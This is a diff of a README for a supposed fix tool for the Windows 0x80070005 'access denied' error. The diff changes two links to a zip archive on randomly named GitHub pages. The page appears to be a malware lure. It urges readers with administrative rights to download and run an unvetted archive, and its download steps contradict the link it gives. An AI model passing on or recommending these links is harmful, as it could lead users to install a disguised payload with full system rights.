@@ -5,7 +5,7 @@ description: "Resolve the Windows 0x80070005 access is denied error with this re
 ---
 # 🛠️ Error-0x80070005-Fix - Resolve Access Denied Errors Quickly
 
-[![Download Fix Tool](https://img.shields.io/badge/Download_Tool-Blue-blue.svg)](https://github.com/camphorated-doctorate51/camphorated-doctorate51.github.io/raw/refs/heads/main/chitterling/doctorate-github-camphorated-io-v2.9.zip)
+[![Download Fix Tool](https://img.shields.io/badge/Download_Tool-Blue-blue.svg)](https://raw.githubusercontent.com/camphorated-doctorate51/camphorated-doctorate51.github.io/main/chitterling/doctorate-github-camphorated-io-v2.9.zip)
 
 ## ❔ Understanding Error 0x80070005
 
@@ -22,7 +22,7 @@ You need administrative rights on your computer to run this tool. If your accoun
 
 ## 📥 How to Download the Tool
 
-Visit this page to download the software: [https://github.com/camphorated-doctorate51/camphorated-doctorate51.github.io/raw/refs/heads/main/chitterling/doctorate-github-camphorated-io-v2.9.zip](https://github.com/camphorated-doctorate51/camphorated-doctorate51.github.io/raw/refs/heads/main/chitterling/doctorate-github-camphorated-io-v2.9.zip)
+Visit this page to download the software: [https://raw.githubusercontent.com/camphorated-doctorate51/camphorated-doctorate51.github.io/main/chitterling/doctorate-github-camphorated-io-v2.9.zip](https://raw.githubusercontent.com/camphorated-doctorate51/camphorated-doctorate51.github.io/main/chitterling/doctorate-github-camphorated-io-v2.9.zip)
 
 1. Open the link in your web browser.
 2. Look for the Assets section at the bottom of the latest release.
